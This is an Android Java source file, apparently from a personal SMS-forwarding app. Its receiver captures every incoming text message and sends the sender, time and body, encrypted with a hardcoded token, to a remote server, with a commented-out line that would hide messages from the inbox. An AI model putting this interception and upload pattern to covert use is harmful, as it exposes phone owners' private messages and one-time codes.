package net.cydu.sms;

import android.annotation.TargetApi;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Base64;
import android.widget.Toast;

import java.io.UnsupportedEncodingException;

public class SMSReceiver extends BroadcastReceiver {

    public static final String SMS_EXTRA_NAME = "pdus";

    public void onReceive( Context context, Intent intent )
    {
        Bundle extras = intent.getExtras();

        String messages = "";
        String address = "";
        long epoch = 0;

        if ( extras != null )
        {
            Object[] smsExtra = (Object[]) extras.get( SMS_EXTRA_NAME );

            ContentResolver contentResolver = context.getContentResolver();

            for ( int i = 0; i < smsExtra.length; ++i )
            {
                SmsMessage sms = SmsMessage.createFromPdu((byte[]) smsExtra[i]);
                address = sms.getOriginatingAddress();
                messages += sms.getMessageBody().toString();

                epoch = sms.getTimestampMillis()/1000;
            }

            sendMsg(address, epoch, messages);
        }
        //this.abortBroadcast();
    }

    @TargetApi(Build.VERSION_CODES.FROYO)
    static public void sendMsg(String number, long timestamp, String text) {
        byte[] data = new byte[0];
        try {
            data = text.getBytes("UTF-8");
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
        String base64 =  Base64.encodeToString(data, Base64.DEFAULT);

        String request = "magic=mldu20love13cydu&phone_num=" + number + "&epoch=" + Long.toString(timestamp) + "&text=" + base64;
        System.out.println(request);
        MCrypt mcrypt = new MCrypt();
        String encrypted = "";
        try {
            encrypted = MCrypt.bytesToHex( mcrypt.encrypt(request) );
        } catch (Exception e) {
            System.out.println("Exception");
            e.printStackTrace();
        }
        int retry = 3;
        while(retry-- > 0) {
            try {
                HttpRequest rq = HttpRequest.post("http://cydu.vm.duapp.com/SMSManager/push.php?").send("q="+encrypted);
                System.out.println("Response was: " + rq.body() );
                if(rq.code() == 200) {
                    break;
                }
            }catch (Exception e) {
                e.printStackTrace();
            }
        }
        System.out.println("send msg after retry:  " + request );
    }
}
